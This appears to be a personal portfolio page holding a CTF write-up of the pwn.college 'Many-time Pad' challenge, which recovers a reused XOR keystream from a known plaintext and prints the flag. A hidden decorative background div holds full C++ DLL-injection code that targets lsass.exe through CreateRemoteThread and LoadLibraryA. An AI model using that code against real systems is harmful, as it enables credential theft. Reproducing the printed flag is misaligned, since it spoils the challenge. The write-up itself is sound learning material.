@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🧠 Many-time Pad — Cryptography Challenge Writeup</title>
+    <meta name="description" content="A digital garden for System Exploitation & Reverse Engineering.">
+    
+    <!-- Open Graph Metadata -->
+    <meta property="og:title" content="🧠 Many-time Pad — Cryptography Challenge Writeup" />
+    <meta property="og:description" content="System Exploitation and Reverse Engineering Portfolio" />
+    <meta property="og:type" content="website" />
+    <meta property="og:image" content="http://localhost:4000/assets/img/re_background.png" />
+    
+    <link rel="stylesheet" href="/assets/css/style.css">
+</head>
+<body>
+    <!-- Authentic Code Background Layer (Windows Exploit Context) -->
+    <div id="bg-code-layer" aria-hidden="true">
+#include &lt;windows.h&gt;
+#include &lt;iostream&gt;
+#include &lt;tlhelp32.h&gt;
+
+// Internal structures for PEB and API Hooking
+typedef struct _UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+} UNICODE_STRING, *PUNICODE_STRING;
+
+DWORD FindProcessId(const std::wstring& processName) {
+    PROCESSENTRY32 processInfo;
+    processInfo.dwSize = sizeof(processInfo);
+
+    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+    if (processesSnapshot == INVALID_HANDLE_VALUE) return 0;
+
+    Process32First(processesSnapshot, &processInfo);
+    if (!processName.compare(processInfo.szExeFile)) {
+        CloseHandle(processesSnapshot);
+        return processInfo.th32ProcessID;
+    }
+
+    while (Process32Next(processesSnapshot, &processInfo)) {
+        if (!processName.compare(processInfo.szExeFile)) {
+            CloseHandle(processesSnapshot);
+            return processInfo.th32ProcessID;
+        }
+    }
+
+    CloseHandle(processesSnapshot);
+    return 0;
+}
+
+int main() {
+    LPCSTR dllPath = "C:\\Payloads\\KAAAMMUUI_Hook.dll";
+    DWORD processId = FindProcessId(L"lsass.exe");
+
+    if (!processId) {
+        std::cerr << "[-] Target process not found." << std::endl;
+        return 1;
+    }
+
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
+    if (!hProcess) {
+        std::cerr << "[-] Failed to open process." << std::endl;
+        return 1;
+    }
+
+    LPVOID pDllPath = VirtualAllocEx(hProcess, 0, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
+    WriteProcessMemory(hProcess, pDllPath, (LPVOID)dllPath, strlen(dllPath) + 1, 0);
+
+    HANDLE hLoadThread = CreateRemoteThread(hProcess, 0, 0,
+        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"),
+        pDllPath, 0, 0);
+
+    WaitForSingleObject(hLoadThread, INFINITE);
+    VirtualFreeEx(hProcess, pDllPath, strlen(dllPath) + 1, MEM_RELEASE);
+    CloseHandle(hLoadThread);
+    CloseHandle(hProcess);
+
+    std::cout << "[+] Payload successfully injected into memory space." << std::endl;
+    return 0;
+}
+    </div>
+
+    <div class="glow-orb-1"></div>
+    <div class="glow-orb-2"></div>
+
+    <header>
+        <div class="container">
+            <a href="/" class="site-title">KAAAMMUUI</a>
+            <nav>
+                <a href="/" >Home</a>
+                <a href="/projects/" >Projects</a>
+                <a href="/game-modding/" >Game Modding</a>
+                <a href="/writeups/" class="active">CTF Writeups</a>
+                <a href="/notes/" >Notes</a>
+            </nav>
+        </div>
+    </header>
+
+    <main>
+        <div class="container page-layout">
+    <article class="post">
+        <header class="post-header">
+            <h1>🧠 Many-time Pad — Cryptography Challenge Writeup</h1>
+            
+            <p class="post-meta">Published: April 27, 2026</p>
+            
+            
+            <p style="color: var(--text-muted); margin-top: 5px; font-size: 0.9rem;">Tags: </p>
+            
+        </header>
+
+        <div class="post-content" id="post-content">
+            <h2 id="-challenge-description">📜 Challenge Description</h2>
+
+<blockquote>
+  <p>The previous challenge gave you the one time pad to decrypt the ciphertext.<br />
+If you did not know the one time pad, and it was only ever used for one message, the previous challenge would be unsolvable!<br />
+In this level, we’ll explore what happens if the latter condition is violated.<br />
+You don’t get the key this time, but we’ll let you encrypt as many messages as you want.<br />
+Can you decrypt the flag?</p>
+</blockquote>
+
+<p><strong>Hint:</strong> Think deeply about how XOR works. It is distributive, commutative, and associative.<br />
+<strong>Tip:</strong> Use Python and the <code class="language-plaintext highlighter-rouge">strxor</code> function from <code class="language-plaintext highlighter-rouge">Crypto.Util.strxor</code>.</p>
+
+<hr />
+
+<h2 id="-challenge-interaction">🔧 Challenge Interaction</h2>
+
+<p>We are given:</p>
+
+<ul>
+  <li><strong>Flag Ciphertext (hex):</strong></li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+b522783fa07f811a39dbddd4d1fddf7e938c0894312b0ab5be246cc574e67a1852729d541d6e6307e8cb4d6583e6ba1f5c8ca4f7e3f7da6caa70f1aa
+</code></pre></div></div>
+
+<ul>
+  <li>The program allows us to encrypt arbitrary plaintexts and gives us back their ciphertexts.</li>
+</ul>
+
+<p>We encrypted the following <strong>known plaintext</strong>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Plaintext (hex): 161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616
+</code></pre></div></div>
+
+<p>And received the following <strong>ciphertext</strong>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Ciphertext (hex): d3430007d506fb604aaaaeb9b4aafd58f1f12de36f6768e9c1410fab21a516667d2cbc047c0c433faf856a10efbdd67e19d782a88facb53fc6319ab6
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="-key-insight">🧠 Key Insight</h2>
+
+<p>Since <strong>OTP was reused</strong>, we can extract the key stream:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>key = ciphertext ⊕ known_plaintext
+</code></pre></div></div>
+
+<p>In Python, using the <code class="language-plaintext highlighter-rouge">strxor</code> function:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">Crypto.Util.strxor</span> <span class="kn">import</span> <span class="n">strxor</span>
+
+<span class="n">c</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">.</span><span class="nf">fromhex</span><span class="p">(</span><span class="sh">'</span><span class="s">d3430007d506fb604aaaaeb9b4aafd58f1f12de36f6768e9c1410fab21a516667d2cbc047c0c433faf856a10efbdd67e19d782a88facb53fc6319ab6</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">.</span><span class="nf">fromhex</span><span class="p">(</span><span class="sh">'</span><span class="s">161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616</span><span class="sh">'</span><span class="p">)</span>
+
+<span class="n">key</span> <span class="o">=</span> <span class="nf">strxor</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span>
+</code></pre></div></div>
+<h3 id="decrypting-the-flag">Decrypting the Flag</h3>
+<p>We now XOR the extracted key with the flag ciphertext:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">flag_c</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">.</span><span class="nf">fromhex</span><span class="p">(</span><span class="sh">'</span><span class="s">b522783fa07f811a39dbddd4d1fddf7e938c0894312b0ab5be246cc574e67a1852729d541d6e6307e8cb4d6583e6ba1f5c8ca4f7e3f7da6caa70f1aa</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">flag</span> <span class="o">=</span> <span class="nf">strxor</span><span class="p">(</span><span class="n">flag_c</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
+<span class="nf">print</span><span class="p">(</span><span class="n">flag</span><span class="p">.</span><span class="nf">decode</span><span class="p">())</span>  <span class="c1"># Final flag
+</span></code></pre></div></div>
+<hr />
+<h2 id="flag">Flag</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwn.college{sA40tk3aHZtJisuxCUzh9H7Fwt6.QX1czMzwSM0IzMyEzW}
+</code></pre></div></div>
+<hr />
+
+        </div>
+    </article>
+    
+    <aside class="toc-container">
+        <div class="toc-sidebar" id="toc-sidebar">
+            <h3>On this page</h3>
+            <ul id="toc-list"></ul>
+        </div>
+    </aside>
+</div>
+
+    </main>
+
+    <footer>
+        <div class="container">
+            <div class="footer-socials" style="margin-bottom: 1rem; display: flex; justify-content: center; gap: 1.5rem;">
+                <a href="https://github.com/HimanshuP601" target="_blank">GitHub</a>
+                <a href="https://www.linkedin.com/in/himanshuparate/" target="_blank">LinkedIn</a>
+                <a href="https://medium.com/@HimanshuP601" target="_blank">Medium</a>
+                <a href="https://pwn.college/hacker/HimanshuP601" target="_blank">pwn.college</a>
+                <a href="mailto:himanshuparate601@gmail.com">Email</a>
+                <span style="color: var(--text-muted);">Discord: himasnhu</span>
+            </div>
+            
+            <div style="margin-bottom: 2rem; display: flex; justify-content: center;">
+                <a href="https://app.hackthebox.com/users/2410266" target="_blank">
+                    <img src="https://www.hackthebox.eu/badge/image/2410266" alt="Hack The Box Badge">
+                </a>
+            </div>
+
+            <p>&copy; 2026 Himanshu. Hosted natively on GitHub Pages.</p>
+        </div>
+    </footer>
+    <script src="/assets/js/main.js"></script>
+</body>
+</html>
